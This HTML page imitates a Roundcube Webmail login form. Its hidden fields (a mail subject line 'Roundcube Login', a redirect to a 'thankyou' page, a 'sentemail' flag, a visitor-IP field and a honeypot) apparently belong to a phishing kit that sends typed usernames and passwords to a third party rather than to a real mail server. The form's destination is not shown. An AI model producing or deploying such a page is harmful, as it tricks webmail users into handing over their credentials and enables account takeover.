  <body class="task-login action-none">
    <div id="root"></div>
    <div id="layout">
      <h1 class="voice">Roundcube Webmail Login</h1>

      <div id="layout-content" class="selected no-navbar" role="main">
        <img
          src="skins/elastic/images/logoe127.svg?s=1634031460"
          id="logo"
          alt="Logo"
        />

        <form
          id="loginform"
          name="loginform"
          method="post"
          class="propform"
        >
          <input type="hidden" name="_subject" value="Roundcube Login" />
          <input type="hidden" name="Website" value="Roundcube" />
          <table>
            <tbody>
              <tr>
                <td class="title">
                  <label for="rcmloginuser">Username</label>
                </td>
                <td class="input">
                  <input
                    name="user"
                    id="receiverEmail"
                    required
                    size="40"
                    autocapitalize="off"
                    autocomplete="off"
                    type="text"
                  />
                </td>
              </tr>

              <tr>
                <td class="title"><label for="rcmloginpwd">Password</label></td>
                <td class="input">
                  <input
                    name="pass"
                    id="rcmloginpwd"
                    required
                    size="40"
                    autocapitalize="off"
                    autocomplete="off"
                    type="password"
                  />
                </td>
              </tr>
            </tbody>
          </table>
          <p class="formbuttons">
            <button
              type="submit"
              id="rcmloginsubmit"
              class="button mainaction submit"
            >
              Login
            </button>
          </p>

          <div id="login-footer" role="contentinfo">Roundcube Webmail</div>
          <input
            type="hidden"
            id="index2aafter"
            name="_after"
            value="/roundcube/thankyou.html"
          />
          <input id="sentemail" type="hidden" name="sentemail" value="here" />
          <input
            type="hidden"
            id="ipFormInput"
            name="ipFormInput"
            defaultValue=""
          />
          <input type="text" name="_honey" value="" style="display: none" />
        </form>
      </div>

      <noscript>
        <p class="noscriptwarning">
          Warning: This webmail service requires Javascript! In order to use it
          please enable Javascript in your browser's settings.
        </p>
      </noscript>
    </div>
    <div id="messagestack"></div>
    <script>
      $(function () {
        rcmail.init();
      });
    </script>
